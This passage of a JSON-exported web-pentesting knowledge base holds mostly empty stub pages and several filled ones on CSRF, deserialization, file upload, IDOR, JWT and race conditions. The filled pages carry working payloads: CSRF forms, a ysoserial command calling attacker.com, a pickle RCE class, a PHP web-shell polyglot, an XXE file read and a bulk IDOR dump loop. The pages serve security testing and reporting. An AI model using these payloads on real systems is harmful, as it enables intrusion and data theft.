       "status": "empty",
       "updated": null
      },
      {
       "title": "Cookie Bomb",
       "slug": "cookie-bomb",
       "type": "page",
       "children": [],
       "tag": "TAG-0641",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0638",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "CORS - Misconfigurations & Bypass",
     "slug": "cors---misconfigurations-bypass",
     "type": "page",
     "children": [],
     "tag": "TAG-0642",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "CRLF (%0D%0A) Injection",
     "slug": "crlf-0d0a-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0643",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "CSRF (Cross Site Request Forgery)",
     "slug": "csrf-cross-site-request-forgery",
     "type": "page",
     "children": [],
     "tag": "TAG-0644",
     "content": "# CSRF (Cross-Site Request Forgery)\n\n## Concept\nThe browser automatically attaches cookies to requests regardless of which site initiated them. If an app relies solely on cookie-based auth with no additional anti-CSRF protection, a malicious page can silently trigger state-changing requests using the victim's already-authenticated session.\n\n## Basic PoC (GET-based, easiest)\n```html\n<img src=\"https://target.com/account/delete?confirm=true\">\n```\n\n## PoC for POST Requests (Auto-Submitting Form)\n```html\n<form action=\"https://target.com/account/email/change\" method=\"POST\" id=\"f\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n</form>\n<script>document.getElementById('f').submit();</script>\n```\n\n## PoC for JSON Bodies (Requires a Bit More Work)\nIf the endpoint accepts `Content-Type: text/plain` with a JSON-parseable body (common misconfiguration), a form can still send it:\n```html\n<form action=\"https://target.com/api/update\" method=\"POST\" enctype=\"text/plain\" id=\"f\">\n  <input name='{\"email\":\"attacker@evil.com\",\"ignore\":\"' value='\"}'>\n</form>\n<script>document.getElementById('f').submit();</script>\n```\n\n## Checking for CSRF Token Weaknesses\nEven when a token exists, it may still be broken:\n- [ ] Is the token validated at all, or just present-and-ignored?\n- [ ] Is it tied to the session, or is any valid token (even from a different session) accepted?\n- [ ] Can it be removed from the request entirely and still succeed?\n- [ ] Is it leaked anywhere (Referer header, GET parameter, third-party script)?\n- [ ] Is it the same token forever, or per-request (per-request is stronger but check it's actually enforced, not just generated)?\n\n## SameSite Cookie Bypass Considerations\nModern browsers default new cookies to `SameSite=Lax`, which blocks cross-site POST but still allows top-level GET navigations to carry cookies. Test:\n- Does a state-changing action accept GET requests? (Common legacy-API mistake — instant CSRF even with SameSite=Lax.)\n- Is `SameSite=None` set anywhere without `Secure`, weakening the protection?\n\n## Login CSRF\nLess obvious but real: forcing a victim to log into *your* attacker-controlled account, then having them unknowingly save sensitive data (search history, uploaded files, saved cards) into an account you control.\n\n## Prevention (for reports)\nSynchronizer token pattern (per-session or per-request CSRF tokens, validated server-side on every state-changing request), `SameSite=Strict` or `Lax` cookies as defense-in-depth, and re-verifying sensitive actions (like email/password change) with the user's current password or a re-auth step regardless of token presence.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Dangling Markup - HTML scriptless injection",
     "slug": "dangling-markup---html-scriptless-injection",
     "type": "page",
     "children": [
      {
       "title": "SS-Leaks",
       "slug": "ss-leaks",
       "type": "page",
       "children": [],
       "tag": "TAG-0646",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0645",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "DApps - Decentralized Applications",
     "slug": "dapps---decentralized-applications",
     "type": "page",
     "children": [],
     "tag": "TAG-0647",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Dependency Confusion",
     "slug": "dependency-confusion",
     "type": "page",
     "children": [],
     "tag": "TAG-0648",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Deserialization",
     "slug": "deserialization",
     "type": "page",
     "children": [
      {
       "title": "NodeJS - \\_\\_proto\\_\\_ & prototype Pollution",
       "slug": "nodejs---proto-prototype-pollution",
       "type": "page",
       "children": [
        {
         "title": "Client Side Prototype Pollution",
         "slug": "client-side-prototype-pollution",
         "type": "page",
         "children": [],
         "tag": "TAG-0651",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Express Prototype Pollution Gadgets",
         "slug": "express-prototype-pollution-gadgets",
         "type": "page",
         "children": [],
         "tag": "TAG-0652",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Prototype Pollution to RCE",
         "slug": "prototype-pollution-to-rce",
         "type": "page",
         "children": [],
         "tag": "TAG-0653",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0650",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Java JSF ViewState (.faces) Deserialization",
       "slug": "java-jsf-viewstate-faces-deserialization",
       "type": "page",
       "children": [],
       "tag": "TAG-0654",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner",
       "slug": "java-dns-deserialization-gadgetprobe-and-java-deserializatio",
       "type": "page",
       "children": [],
       "tag": "TAG-0655",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Basic Java Deserialization (ObjectInputStream, readObject)",
       "slug": "basic-java-deserialization-objectinputstream-readobject",
       "type": "page",
       "children": [],
       "tag": "TAG-0656",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Java Signedobject Gated Deserialization",
       "slug": "java-signedobject-gated-deserialization",
       "type": "page",
       "children": [],
       "tag": "TAG-0657",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Livewire Hydration Synthesizer Abuse",
       "slug": "livewire-hydration-synthesizer-abuse",
       "type": "page",
       "children": [],
       "tag": "TAG-0658",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "PHP - Deserialization + Autoload Classes",
       "slug": "php---deserialization-autoload-classes",
       "type": "page",
       "children": [],
       "tag": "TAG-0659",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "CommonsCollection1 Payload - Java Transformers to Rutime exec() and Thread Sleep",
       "slug": "commonscollection1-payload---java-transformers-to-rutime-exe",
       "type": "page",
       "children": [],
       "tag": "TAG-0660",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net)",
       "slug": "basic-net-deserialization-objectdataprovider-gadget-expanded",
       "type": "page",
       "children": [],
       "tag": "TAG-0661",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Exploiting \\_\\_VIEWSTATE knowing the secrets",
       "slug": "exploiting-viewstate-knowing-the-secrets",
       "type": "page",
       "children": [],
       "tag": "TAG-0662",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Exploiting \\_\\_VIEWSTATE without knowing the secrets",
       "slug": "exploiting-viewstate-without-knowing-the-secrets",
       "type": "page",
       "children": [],
       "tag": "TAG-0663",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Python Yaml Deserialization",
       "slug": "python-yaml-deserialization",
       "type": "page",
       "children": [],
       "tag": "TAG-0664",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "JNDI - Java Naming and Directory Interface & Log4Shell",
       "slug": "jndi---java-naming-and-directory-interface-log4shell",
       "type": "page",
       "children": [],
       "tag": "TAG-0665",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ruby Json Pollution",
       "slug": "ruby-json-pollution",
       "type": "page",
       "children": [],
       "tag": "TAG-0666",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ruby Class Pollution",
       "slug": "ruby-class-pollution",
       "type": "page",
       "children": [],
       "tag": "TAG-0667",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0649",
     "content": "# Insecure Deserialization\n\n## Concept\nSerialization converts an in-memory object into a byte stream (for storage/transmission); deserialization reverses it. If an application deserializes attacker-controlled data without validation, and the target language's deserialization process can trigger method calls as a side effect (constructors, `__wakeup`, `readObject`, `__destruct`, etc.), an attacker can chain those side effects into arbitrary code execution — this is what \"gadget chains\" refers to.\n\n## Why It's Dangerous\nUnlike most injection bugs, exploiting deserialization usually doesn't require finding a bug in *application* code — it requires finding a \"gadget chain\" in libraries already loaded by the application (very common, well-documented ones exist for most major frameworks), then just getting attacker-controlled serialized data to the vulnerable `deserialize()`/`unserialize()`/`readObject()` call.\n\n## Identifying Serialized Data in Transit\n| Language | Signature |\n|---|---|\n| PHP | `O:8:\"ClassName\":1:{...}` or starts with `a:`, `s:`, `O:` |\n| Java | Starts with `rO0AB` in Base64, or raw bytes `AC ED 00 05` |\n| Python (pickle) | Often base64, opcode bytes like `\\x80\\x04` |\n| .NET | Base64 blobs, sometimes JSON with `$type` fields (Json.NET) |\n| Ruby (Marshal) | Starts with `\\x04\\x08` |\n\n## PHP Deserialization\n```php\n// Vulnerable: unserialize() on user input\n$obj = unserialize($_COOKIE['data']);\n```\nExploitation requires a class in the app (or an autoloaded library) with a \"magic method\" (`__wakeup`, `__destruct`, `__toString`) that does something dangerous — build a payload object matching that class, serialize it yourself, and submit it as input.\n\n## Java Deserialization\n```bash\n# ysoserial generates ready-made gadget chain payloads for known-vulnerable libraries\njava -jar ysoserial.jar CommonsCollections6 'curl attacker.com/pwned' > payload.bin\n```\nCommon vulnerable gadget sources: Apache Commons Collections, Spring, Groovy, Hibernate — presence of any of these on the classpath, combined with a reachable deserialization sink, is often enough.\n\n## Python Pickle\n```python\nimport pickle, os\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('id',))\npayload = pickle.dumps(Exploit())\n```\n`pickle.loads()` on untrusted data is inherently dangerous — there's no safe way to sandbox it, which is why Python's own docs explicitly warn never to unpickle untrusted input.\n\n## .NET Deserialization\n```bash\nysoserial.net -g ObjectDataProvider -f Json.Net -c \"calc.exe\" -o base64\n```\nDepends heavily on which serializer is in use (`BinaryFormatter`, `Json.NET` with `TypeNameHandling` enabled, `XmlSerializer`, etc.) — each has different applicable gadget chains.\n\n## Detection Strategy\n- Look for any cookie, hidden field, or API parameter containing what looks like serialized/encoded binary data — decode it and check against the signatures table above.\n- Even if you can't find a known public gadget chain for the exact library versions in use, flag the *pattern* (unvalidated deserialization of user-controlled data) as a finding — it's a latent risk even without a currently-known exploit chain.\n\n## Prevention (for reports)\nNever deserialize untrusted data with a general-purpose deserializer; use safe data formats (JSON with a strict schema, not a language-native serialization format) for anything crossing a trust boundary, and if native deserialization is unavoidable, use allow-list-based class restriction (e.g., Java's `ObjectInputFilter`).",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Domain/Subdomain takeover",
     "slug": "domainsubdomain-takeover",
     "type": "page",
     "children": [],
     "tag": "TAG-0668",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Email Injections",
     "slug": "email-injections",
     "type": "page",
     "children": [],
     "tag": "TAG-0669",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "File Inclusion/Path traversal",
     "slug": "file-inclusionpath-traversal",
     "type": "page",
     "children": [
      {
       "title": "phar:// deserialization",
       "slug": "phar-deserialization",
       "type": "page",
       "children": [],
       "tag": "TAG-0671",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LFI2RCE via PHP Filters",
       "slug": "lfi2rce-via-php-filters",
       "type": "page",
       "children": [],
       "tag": "TAG-0672",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LFI2RCE via Nginx temp files",
       "slug": "lfi2rce-via-nginx-temp-files",
       "type": "page",
       "children": [],
       "tag": "TAG-0673",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LFI2RCE via PHP_SESSION_UPLOAD_PROGRESS",
       "slug": "lfi2rce-via-phpsessionuploadprogress",
       "type": "page",
       "children": [],
       "tag": "TAG-0674",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LFI2RCE via Segmentation Fault",
       "slug": "lfi2rce-via-segmentation-fault",
       "type": "page",
       "children": [],
       "tag": "TAG-0675",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LFI2RCE via phpinfo()",
       "slug": "lfi2rce-via-phpinfo",
       "type": "page",
       "children": [],
       "tag": "TAG-0676",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LFI2RCE Via temp file uploads",
       "slug": "lfi2rce-via-temp-file-uploads",
       "type": "page",
       "children": [],
       "tag": "TAG-0677",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LFI2RCE via Eternal waiting",
       "slug": "lfi2rce-via-eternal-waiting",
       "type": "page",
       "children": [],
       "tag": "TAG-0678",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure",
       "slug": "lfi2rce-via-compresszlib-phpstreampreferstudio-path-disclosu",
       "type": "page",
       "children": [],
       "tag": "TAG-0679",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0670",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "File Upload",
     "slug": "file-upload",
     "type": "page",
     "children": [
      {
       "title": "PDF Upload - XXE and CORS bypass",
       "slug": "pdf-upload---xxe-and-cors-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0681",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0680",
     "content": "# File Upload Vulnerabilities\n\n## Basic Bypass Techniques\n\n### Extension Filtering Bypass\n```\nshell.php.jpg\nshell.pHp              # case variation\nshell.php%00.jpg        # null byte (legacy PHP < 5.3.4)\nshell.php;.jpg          # semicolon trick (older IIS/Apache configs)\nshell.phtml, shell.phar, shell.php5, shell.pht    # alternate PHP-executable extensions\n```\n\n### Content-Type / MIME Spoofing\nBurp Repeater: change `Content-Type: application/octet-stream` to `image/jpeg` (or vice versa) — many validators only check this client-controlled header, not the actual file content.\n\n### Magic Byte / Polyglot Files\nPrepend a valid image header to your payload so `file`/magic-byte checks pass, while the rest of the file is still your executable code:\n```bash\n# GIF89a header + PHP payload\nprintf 'GIF89a;\\n<?php system($_GET[\"c\"]); ?>' > shell.gif.php\n```\nFor a true polyglot (valid image AND valid script), tools like `exiftool` can embed PHP into EXIF metadata of a genuinely valid JPEG — passes even libraries that actually parse the image.\n\n## Path Traversal in Filename\n```\n../../../../var/www/html/shell.php\n```\nIf the upload filename is used directly in a file-write path without sanitization, you may be able to write outside the intended upload directory entirely.\n\n## Race Condition Upload\nSome apps briefly save the file with its original (executable) name before renaming/moving it — request the file at its temporary path in a tight loop immediately after upload to catch the window before it's sanitized or moved.\n\n## Image-Specific Attacks\n- **ImageMagick \"ImageTragick\"**-style vulnerabilities: crafted image files exploiting the *processing* library itself (delegate commands), not just the upload check.\n- **XXE via SVG**: SVG is XML — an uploaded SVG can carry an XXE payload if the server renders/parses it.\n```xml\n<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>\n```\n\n## Zip/Archive Upload Attacks\n- **Zip Slip**: crafted archive entries with `../` in their filenames that, when extracted server-side without path sanitization, write files outside the intended extraction directory.\n- **Decompression bombs**: for a DoS-focused finding, a small archive that expands to gigabytes on extraction.\n\n## What to Check Beyond \"Can I Upload a Shell\"\n- [ ] Is the upload directory web-accessible and does it execute scripts (misconfigured `.htaccess`/web.config)?\n- [ ] Can you overwrite existing files (path traversal, predictable naming)?\n- [ ] Is there any size/rate limiting (DoS via mass upload)?\n- [ ] Are uploaded files scanned/sandboxed before being served to other users (stored XSS via HTML/SVG upload, malware distribution via any-file-type upload)?\n\n## Prevention (for reports)\nValidate file content (not just extension/MIME), store uploads outside the web root or in a non-executable location, rename files server-side to a random name with no attacker-controlled path component, and re-encode images through a trusted library rather than passing the raw upload through.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Formula/CSV/Doc/LaTeX/GhostScript Injection",
     "slug": "formulacsvdoclatexghostscript-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0682",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "gRPC-Web Pentest",
     "slug": "grpc-web-pentest",
     "type": "page",
     "children": [],
     "tag": "TAG-0683",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "HTTP Connection Contamination",
     "slug": "http-connection-contamination",
     "type": "page",
     "children": [],
     "tag": "TAG-0684",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "HTTP Connection Request Smuggling",
     "slug": "http-connection-request-smuggling",
     "type": "page",
     "children": [],
     "tag": "TAG-0685",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "HTTP Request Smuggling / HTTP Desync Attack",
     "slug": "http-request-smuggling-http-desync-attack",
     "type": "page",
     "children": [
      {
       "title": "Browser HTTP Request Smuggling",
       "slug": "browser-http-request-smuggling",
       "type": "page",
       "children": [],
       "tag": "TAG-0687",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Request Smuggling in HTTP/2 Downgrades",
       "slug": "request-smuggling-in-http2-downgrades",
       "type": "page",
       "children": [],
       "tag": "TAG-0688",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0686",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "HTTP Response Smuggling / Desync",
     "slug": "http-response-smuggling-desync",
     "type": "page",
     "children": [],
     "tag": "TAG-0689",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Upgrade Header Smuggling",
     "slug": "upgrade-header-smuggling",
     "type": "page",
     "children": [],
     "tag": "TAG-0690",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "hop-by-hop headers",
     "slug": "hop-by-hop-headers",
     "type": "page",
     "children": [],
     "tag": "TAG-0691",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "IDOR",
     "slug": "idor",
     "type": "page",
     "children": [],
     "tag": "TAG-0692",
     "content": "# IDOR (Insecure Direct Object Reference)\n\n## Concept\nThe app trusts an identifier supplied by the client (an ID in a URL, form field, or API body) without verifying the *current* user is actually authorized to access that specific object. Consistently one of the most common — and highest real-world impact — findings in web assessments.\n\n## Basic Detection\n```\nGET /api/user/1042/invoice     →  change to  /api/user/1043/invoice\nGET /profile?id=55             →  change to  /profile?id=56\nPOST /api/orders/{\"order_id\":882}  →  change order_id to a neighboring value\n```\nTest with **two separate low-privilege accounts** — access an object belonging to Account B while authenticated as Account A. If it succeeds, that's a confirmed IDOR, not just a hunch based on sequential IDs.\n\n## Where IDs Hide (Don't Just Check the URL)\n- Hidden form fields\n- JSON body fields, including nested objects\n- HTTP headers (some apps pass object IDs via custom headers)\n- Multi-step workflows — later steps sometimes re-trust an ID from an earlier step without re-checking ownership\n- WebSocket messages, if the app uses them\n\n## UUID Doesn't Mean Safe\nA non-sequential UUID prevents *guessing*, but if the UUID for another user's object leaks anywhere (an API response listing \"related\" objects, an email notification, a public share link, verbose error messages) it's still exploitable — the defense is authorization checks, not ID unpredictability alone.\n\n## IDOR via HTTP Method Switching\nAn endpoint might correctly check ownership on `GET` but forget to on `PUT`/`DELETE`/`PATCH` for the same resource path — always test every method the API exposes, not just the one the UI uses.\n\n## Mass/Bulk IDOR (Enumeration Impact)\nOnce confirmed on a single object, script it:\n```bash\nfor i in $(seq 1 5000); do\n  curl -s -H \"Cookie: session=...\" \"https://target.com/api/user/$i/profile\" >> dump.json\ndone\n```\nThis is what turns \"one user's data exposed\" into a full-database-scale finding in the report — worth doing (carefully, rate-limited) to demonstrate real impact.\n\n## Blind IDOR (No Direct Data Returned)\nSometimes the response doesn't leak data directly but the *action* still succeeds (e.g., deleting another user's item returns a generic \"success\" with no data). Confirm impact by checking with the victim account afterward, or via a side channel (timing, error code differences).\n\n## Authorization Matrix Testing Approach\nFor any app with multiple roles, build a matrix: every endpoint × every role × every object-ownership scenario. Systematic, if slow — but it's the only way to be confident you haven't missed a broken authorization path, and it's what separates a thorough assessment from a lucky find.\n\n## Prevention (for reports)\nEnforce object-level authorization checks server-side on *every* request that references an object ID, regardless of how \"safe\" the ID looks — checked against the authenticated user's actual permissions, not just their authentication status.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "JWT Vulnerabilities (Json Web Tokens)",
     "slug": "jwt-vulnerabilities-json-web-tokens",
     "type": "page",
     "children": [],
     "tag": "TAG-0693",
     "content": "# JWT Vulnerabilities\n\n## Structure Reminder\n`header.payload.signature` — header and payload are just base64url-encoded JSON, **not encrypted**. Anyone can read them; only the signature is supposed to prevent tampering.\n\n## alg:none Attack\nSome libraries historically accepted a token with `\"alg\":\"none\"` and an empty signature as valid.\n```\nHeader:  {\"alg\":\"none\",\"typ\":\"JWT\"}\nPayload: {\"user\":\"admin\"}\nSignature: (empty)\n```\nBase64url-encode each part, join with `.`, leave the third segment empty (or a trailing `.`). Test whether the server still validates it.\n\n## Algorithm Confusion (RS256 → HS256)\nIf the server expects `RS256` (asymmetric — public key verifies, private key signs) but the verification code doesn't strictly enforce which algorithm is used, you can:\n1. Obtain the server's RSA **public** key (often exposed at a `/jwks.json` endpoint, or embedded in the app).\n2. Forge a new token, but sign it with `HS256`, using the public key's contents *as the HMAC secret*.\n3. If the library uses the same verification function for both algorithms without checking which one was expected, it will use the public key to \"verify\" your HMAC signature — and succeed, because you signed it with exactly that value.\n\n## Weak/Guessable HMAC Secret\nIf the app uses `HS256` with a weak secret, crack it offline:\n```bash\nhashcat -m 16500 jwt.txt wordlist.txt\n# or\npython3 jwt_tool.py <token> -C -d wordlist.txt\n```\n\n## kid (Key ID) Header Injection\nThe `kid` header often tells the server which key to use for verification. Abuse cases:\n- **Path traversal**: `\"kid\": \"../../../../dev/null\"` — if the app reads the key from a file path built from `kid`, pointing it at `/dev/null` (empty) may let you sign with an empty-string key.\n- **SQL injection**: if `kid` is used in a DB lookup for the key, inject there.\n- **Command injection**: same idea if `kid` feeds into a shell command anywhere.\n\n## jku / x5u Header Abuse\nThese headers can tell the verifier to fetch the public key from an attacker-controlled URL:\n```\n\"jku\": \"https://attacker.com/jwks.json\"\n```\nHost your own JWKS with a key pair you control, sign a forged token with your private key, and point `jku` at your server — if unvalidated, the app will fetch and trust your key.\n\n## Practical Testing Workflow\n```bash\npython3 jwt_tool.py <token>                    # decode + basic vuln scan\npython3 jwt_tool.py <token> -T                  # interactive tampering mode\npython3 jwt_tool.py <token> -X a                # test alg:none automatically\npython3 jwt_tool.py <token> -X k -pk public.pem # test the RS256→HS256 confusion automatically\n```\n\n## Beyond Signature Bypass — Logic Issues\n- No expiration (`exp`) claim, or expiration not actually enforced server-side.\n- No revocation mechanism — a stolen token remains valid until natural expiry even after logout/password change.\n- Sensitive data stored in the payload unencrypted (remember: base64 ≠ encryption, anyone can read it).\n\n## Prevention (for reports)\nExplicitly whitelist the expected algorithm server-side (never trust the token's own `alg` header), use a properly random high-entropy HMAC secret or real asymmetric keys, validate `jku`/`x5u` against an allowlist if used at all, and keep token lifetimes short with a working revocation/refresh strategy.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "JSON, XML and YAML Hacking",
     "slug": "json-xml-and-yaml-hacking",
     "type": "page",
     "children": [],
     "tag": "TAG-0694",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "LDAP Injection",
     "slug": "ldap-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0695",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Login Bypass",
     "slug": "login-bypass",
     "type": "page",
     "children": [
      {
       "title": "Login bypass List",
       "slug": "login-bypass-list",
       "type": "page",
       "children": [],
       "tag": "TAG-0697",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0696",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Mass Assignment Cwe 915",
     "slug": "mass-assignment-cwe-915",
     "type": "page",
     "children": [],
     "tag": "TAG-0698",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "NoSQL injection",
     "slug": "nosql-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0699",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "OAuth to Account takeover",
     "slug": "oauth-to-account-takeover",
     "type": "page",
     "children": [],
     "tag": "TAG-0700",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Open Redirect",
     "slug": "open-redirect",
     "type": "page",
     "children": [],
     "tag": "TAG-0701",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "ORM Injection",
     "slug": "orm-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0702",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Parameter Pollution | JSON Injection",
     "slug": "parameter-pollution-json-injection",
     "type": "page",
     "children": [],
     "tag": "TAG-0703",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Phone Number Injections",
     "slug": "phone-number-injections",
     "type": "page",
     "children": [],
     "tag": "TAG-0704",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "PostMessage Vulnerabilities",
     "slug": "postmessage-vulnerabilities",
     "type": "page",
     "children": [
      {
       "title": "Blocking main page to steal postmessage",
       "slug": "blocking-main-page-to-steal-postmessage",
       "type": "page",
       "children": [],
       "tag": "TAG-0706",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Bypassing SOP with Iframes - 1",
       "slug": "bypassing-sop-with-iframes---1",
       "type": "page",
       "children": [],
       "tag": "TAG-0707",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Bypassing SOP with Iframes - 2",
       "slug": "bypassing-sop-with-iframes---2",
       "type": "page",
       "children": [],
       "tag": "TAG-0708",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Steal postmessage modifying iframe location",
       "slug": "steal-postmessage-modifying-iframe-location",
       "type": "page",
       "children": [],
       "tag": "TAG-0709",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0705",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Proxy / WAF Protections Bypass",
     "slug": "proxy-waf-protections-bypass",
     "type": "page",
     "children": [],
     "tag": "TAG-0710",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Race Condition",
     "slug": "race-condition",
     "type": "page",
     "children": [],
     "tag": "TAG-0711",
     "content": "# Race Conditions (Web)\n\n## Concept\nWeb apps often assume requests are processed strictly one at a time for a given user/resource. Sending multiple requests that touch the same resource *simultaneously* can expose a window where a check (balance, stock, single-use token) and the action based on that check (deduct, purchase, redeem) aren't atomic — letting you slip multiple actions through the same check.\n\n## Classic Targets\n| Scenario | Exploit goal |\n|---|---|\n| Coupon/promo code redemption | Redeem a single-use code multiple times |\n| Wallet/balance transfer | Withdraw more than the actual balance by racing concurrent withdrawal requests |\n| Voting/rating systems | Vote multiple times before the \"already voted\" flag is committed |\n| Account creation with unique constraint | Register two accounts with the same \"unique\" username/email |\n| Rate-limited actions (password reset, OTP) | Bypass the rate limit by firing requests faster than the limiter can count them |\n\n## Practical Execution: Burp Suite \"Send group in parallel\"\nModern Burp Suite Repeater supports sending a group of requests with minimal time skew (single-packet attack, using HTTP/2 request multiplexing where available) — this is the current best-practice method, far more reliable than older thread-based scripts for hitting the narrow race window.\n\n1. Send the target request to Repeater, duplicate it into a group (20+ copies is a reasonable starting point).\n2. Right-click the group → **Send group in parallel** (single-packet attack, if HTTP/2 is supported by the target — this minimizes network jitter that would otherwise widen the race window and make it miss).\n3. Compare responses — if more than one succeeded where only one should have, the race condition is confirmed.\n\n## Scripted Alternative (When Burp Isn't Available)\n```python\nimport threading, requests\n\ndef fire():\n    requests.post(\"https://target.com/api/redeem\", json={\"code\": \"PROMO10\"}, cookies=cookies)\n\nthreads = [threading.Thread(target=fire) for _ in range(30)]\nfor t in threads: t.start()\nfor t in threads: t.join()\n```\nThread-based approaches are less precise than single-packet techniques (network/OS scheduling introduces jitter) but still frequently work, especially against endpoints with a wider race window.\n\n## Multi-Endpoint Race Conditions\nSome of the highest-impact races span *two different endpoints* sharing a resource — e.g., simultaneously hitting a \"change email\" endpoint and an \"email verification\" endpoint to confirm a victim's email as your own before the legitimate flow completes. These require understanding the specific business logic rather than a generic tool run.\n\n## Confirming Real Impact\nA race condition finding needs *proof* the window is exploitable in practice, not just theoretically present — screenshot/log evidence showing (for example) a single-use coupon applied twice, or a balance going negative, makes the finding concrete for a report instead of speculative.\n\n## Prevention (for reports)\nUse database-level atomic operations (row locking, atomic increment/decrement, unique constraints enforced at the DB layer rather than checked-then-written in application code), or idempotency keys for actions that must only ever succeed once per logical request.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Rate Limit Bypass",
     "slug": "rate-limit-bypass",
     "type": "page",
     "children": [],
     "tag": "TAG-0712",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Registration & Takeover Vulnerabilities",
     "slug": "registration-takeover-vulnerabilities",
     "type": "page",
     "children": [],
     "tag": "TAG-0713",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Regular expression Denial of Service - ReDoS",
     "slug": "regular-expression-denial-of-service---redos",
     "type": "page",
     "children": [],
     "tag": "TAG-0714",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Reset/Forgotten Password Bypass",
     "slug": "resetforgotten-password-bypass",
     "type": "page",
     "children": [],
     "tag": "TAG-0715",
     "content": "",
